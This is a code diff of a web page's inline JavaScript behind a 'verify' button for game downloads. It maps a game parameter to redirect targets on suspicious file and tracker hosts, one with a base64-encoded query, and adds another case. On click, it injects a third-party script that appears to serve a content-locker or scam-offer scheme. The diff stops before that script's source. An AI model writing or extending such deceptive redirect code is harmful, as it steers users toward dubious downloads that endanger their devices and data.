@@ -42,7 +42,6 @@
     </div>
 
     <script type="text/javascript">
-        // Logic to detect game and set target
         const urlParams = new URLSearchParams(window.location.search);
         const gameId = urlParams.get('game');
         
@@ -54,19 +53,20 @@
             const btn = document.getElementById('verifyBtn');
             let targetUrl = 'https://playthegame.site';
 
-            // Set specific URLs
+            // Redirection logic
             if (gameId === 'mario') {
                 targetUrl = 'https://file484973.cloud04y.cfd/';
             } else if (gameId === 'tomodachi') {
                 targetUrl = 'https://citra-emulator.com/download/android/';
             } else if (gameId === 'pokemon') {
                 targetUrl = 'https://pagecows.info/tracker/index.php?code=vtj&q=b64%3AUG9rw6ltb24gUG9rb3BpYSBOU1AgRG93bmxvYWQgMS4wLjMgVXBkYXRlIChOaW50ZW5kbyBTd2l0Y2gp';
+            } else if (gameId === 'citra') {
+                targetUrl = 'https://citra-emulator.com/download';
             }
 
             window.og_redirect = targetUrl; 
             btn.innerHTML = "Loading...";
 
-            // Inject script only on click
             var script = document.createElement('script');
             script.type = 'text/javascript';
             script.id = 'ogjs';
